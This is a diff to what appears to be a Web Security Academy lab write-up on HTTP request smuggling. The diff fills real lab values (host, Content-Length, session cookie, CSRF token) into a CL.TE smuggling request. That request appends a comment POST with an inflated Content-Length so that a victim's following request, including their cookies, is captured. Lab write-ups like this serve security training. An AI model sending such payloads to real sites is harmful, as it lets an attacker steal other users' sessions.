@@ -126,19 +126,19 @@ X-Forwarded-Server: EXPLOIT-SERVER-ID.exploit-server.net
 
 ```html
 POST / HTTP/1.1
-Host: TARGET.web-security-academy.net
+Host: 0af8006004fb07f5c46a3c4600b20065.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 256
+Content-Length: 242
 Transfer-Encoding: chunked
 
 0
 
 POST /post/comment HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 850
-Cookie: session=your-session-token
+Content-Length: 798
+Cookie: session=rmK9dkBeR1V3lg2bCgjfOkyBxImZMb6P
 
-csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40mail.net&website=&comment=test
+csrf=nVFjkw2QdI4G6hDY9nW39x0KOtFebyAd&postId=8&name=c&email=c%40c.c&website=&comment=c
 ```
   
 ![Exploiting HTTP request smuggling with content-length value](content-length-capture-victim-request.png)  
